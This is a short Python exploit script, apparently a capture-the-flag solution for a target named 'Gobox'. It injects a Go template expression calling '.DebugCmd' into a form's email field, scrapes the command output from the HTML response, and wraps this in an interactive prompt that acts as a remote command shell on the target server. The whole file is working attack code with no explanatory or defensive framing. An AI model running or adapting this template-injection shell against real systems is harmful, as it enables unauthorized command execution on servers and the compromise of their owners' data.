import requests
import sys
import cmd
import html
from bs4 import BeautifulSoup

curly_op = "{{"
curly_cl = "}}"

def exploit(url, cmd):
    payload = {'email': f'{curly_op} .DebugCmd "{cmd}" {curly_cl}'}
    resp = requests.post(url, data=payload)
    soup = BeautifulSoup(resp.text, features="lxml")
    output = [tag.text for tag in soup.find_all("form")][0]
    print(html.unescape((str(str(output).strip().split(
        "Email Sent To:")[1]).split("Login")[0]).strip()))


class GoboxSSTI(cmd.Cmd):
    prompt = '$> '

    def default(self, line):
        exploit(url, line)


if __name__ == '__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        sys.exit(-1)

    term = GoboxSSTI()
    try:
        term.cmdloop()
    except KeyboardInterrupt:
        sys.exit(-1)
